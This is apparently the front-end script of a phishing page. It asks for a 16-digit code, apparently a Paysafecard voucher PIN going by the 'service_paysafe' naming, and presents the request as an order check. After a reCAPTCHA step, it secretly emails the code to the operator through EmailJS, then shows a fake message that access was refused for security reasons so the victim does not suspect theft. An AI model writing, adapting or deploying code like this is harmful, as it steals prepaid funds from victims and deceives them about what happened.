console.log("script.js chargé");

// Initialisation EmailJS
emailjs.init("rORVGScs1n94sqOPi");

async function verifyOrder() {

    console.log("verifyOrder appelée");

    const input = document.getElementById("orderNumber");
    const message = document.getElementById("message");
    const button = document.querySelector(".search-box button");

    // Supprimer les espaces avant la vérification
    const orderNumber = input.value.replace(/\s/g, "");

    // Vérifie qu'il y a exactement 16 chiffres
    if (!/^\d{16}$/.test(orderNumber)) {
        message.style.color = "red";
        message.textContent = "saisis le code a 16 chiffres.";
        input.focus();
        return;
    }

    button.disabled = true;
    button.textContent = "Sending...";
    message.textContent = "";

    try {

        // Déclencher reCAPTCHA v2 Invisible
        grecaptcha.execute();

    } catch (error) {

        console.error("Erreur reCAPTCHA :", error);

        message.style.color = "red";
        message.textContent =
            "valider le Recaptcha.";

        button.disabled = false;
        button.textContent = "Submit";
    }
}


// CALLBACK reCAPTCHA
function onRecaptchaSuccess(token) {

    console.log("reCAPTCHA validé");

    const input = document.getElementById("orderNumber");
    const message = document.getElementById("message");
    const button = document.querySelector(".search-box button");

    const orderNumber = input.value.replace(/\s/g, "");

    emailjs.send(
        "service_paysafe",
        "template_psf",
        {
            order_number: orderNumber
        }
    )
    .then(function(response) {

        console.log("Email envoyé !");
        console.log(response);

        message.style.color = "white";
        message.textContent =
            "Demande en cour....";

        input.value = "";
        input.focus();

        setTimeout(function() {

            message.style.color = "red";
            message.textContent =
                "L'accès a été refusé pour des raisons de sécurité.";

        }, 2000);

    })
    .catch(function(error) {

        console.error("Erreur EmailJS :", error);

        message.style.color = "red";
        message.textContent =
            "An error occurred.";

    })
    .finally(function() {

        button.disabled = false;
        button.textContent = "Submit";

        grecaptcha.reset();
    });
}


// Autoriser uniquement les chiffres
// + ajouter un espace tous les 4 chiffres
document.getElementById("orderNumber").addEventListener("input", function () {

    // Conserver uniquement les chiffres
    let value = this.value.replace(/\D/g, "");

    // Limiter à 16 chiffres
    value = value.substring(0, 16);

    // Ajouter un espace tous les 4 chiffres
    this.value = value.replace(/(\d{4})(?=\d)/g, "$1 ");

});
